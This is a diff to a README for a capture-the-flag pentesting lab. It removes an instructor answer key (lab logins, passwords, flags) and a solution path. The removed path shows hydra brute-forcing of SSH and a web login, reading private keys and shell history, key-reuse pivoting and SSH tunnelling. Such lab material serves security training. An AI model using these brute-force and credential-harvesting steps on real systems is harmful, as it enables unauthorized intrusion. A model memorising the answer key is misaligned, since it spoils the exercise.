@@ -15,7 +15,8 @@ box directly.
 
 ## Topology
 
-All hosts share one flat subnet (`192.168.0.0/24`). 
+All hosts share one flat subnet (`192.168.0.0/24`). The router provides egress
+only and requires no scenario-specific setup.
 
 | Host | IP | Role | OS |
 |------|------|------|------|
@@ -29,11 +30,7 @@ them and reach them only over SSH/the pivot.
 
 ---
 
-## Deployment
 
-The play order matters: `uservm` runs first and generates the SSH keypair, then
-`servervm` reads that public key (via `hostvars`) to authorize it for `admin`.
-Do not reorder the plays.
 
 ### Dependencies
 
@@ -45,61 +42,7 @@ Do not reorder the plays.
 
 ---
 
-## Answer key
 
-> Instructor reference — do not distribute to trainees.
-
-| Item | Value | Source |
-|------|-------|--------|
-| Host A / Host B IPs | `192.168.0.2`, `192.168.0.10` | arp-scan / `nmap -sn` |
-| Workstation login | `jdoe` | hydra (in `users.txt`) |
-| Workstation password | `letmein123` | hydra (in `passwords.txt`) |
-| `ssh_flag` | `CR18{ssh_k3y_reu5e_l4teral}` | trailing comment in `~/.ssh/id_rsa` |
-| Server account name | `admin` | `jdoe`'s `~/.bash_history` |
-| Administrator's name | `Mark Stevens` | `/home/admin/flag1.txt` |
-| Maintenance username | `maintenance` | hardcoded in panel; hydra `-l` |
-| Maintenance password | `admin123` | hydra (in `wordlist.txt`) |
-| Panel capstone flag | `CR18{p1vot_tunnel_pwned}` | returned on successful `/login` |
-
-Wordlists are staged at `/home/pentester/Desktop/` and `/home/pentester/` with the
-correct answers near the top so both brute-forces resolve in seconds.
-
----
-
-## Solution path (reference)
-
-**A3 — discovery, initial access, credential harvest**
-
-```bash
-ip a
-sudo arp-scan 192.168.0.0/24            # or: nmap -sn 192.168.0.0/24
-nmap -p 22 192.168.0.10
-hydra -L users.txt -P passwords.txt ssh://192.168.0.10 -t 4
-ssh jdoe@192.168.0.10
-ls -la ~/.ssh && cat ~/.ssh/id_rsa      # ssh_flag is at the bottom
-cat ~/.bash_history                      # reveals admin@192.168.0.2
-```
-
-**A4 — pivot, tunnel, panel brute-force**
-
-```bash
-# From the workstation: reuse the key to reach the server
-ssh -i ~/.ssh/id_rsa admin@192.168.0.2
-cat /home/admin/flag1.txt
-
-# From the attacker box: tunnel the LAN-only panel through the workstation
-ssh -L 8080:192.168.0.2:8080 jdoe@192.168.0.10
-curl http://localhost:8080/login        # -> Unauthorized
-hydra -l maintenance -P wordlist.txt http://localhost:8080/login \
-  http-post-form "/login:username=^USER^&password=^PASS^:Unauthorized" -t 8
-```
-
-Brute-force tuning is deliberate: `-t 4` on SSH avoids OpenSSH `MaxStartups`
-connection drops, and `-t 8` on HTTP stays within the Flask dev server's limits
-(it runs with `threaded=True`). The `:Unauthorized` fail string matches the
-panel's 401 body exactly — don't change one without the other.
-
----
 
 ## Design notes & caveats
 
